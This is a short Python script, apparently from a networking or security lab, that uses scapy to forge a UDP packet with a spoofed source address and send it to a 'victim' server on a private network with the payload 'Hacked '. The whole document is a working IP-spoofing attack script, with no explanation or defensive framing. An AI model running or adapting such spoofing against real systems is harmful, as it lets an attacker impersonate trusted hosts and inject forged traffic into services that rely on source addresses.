from scapy.all import *

# Define victim details
victim_ip = "192.168.220.132"  # Server IP
victim_port = 9999             # Server Port
spoofed_ip = "192.168.220.133"  # Client IP

# Craft the spoofed packet
packet = IP(src=spoofed_ip, dst=victim_ip) / UDP(sport=12344, dport=victim_port) / "Hacked "

# Send the packet
send(packet)

print("Done")

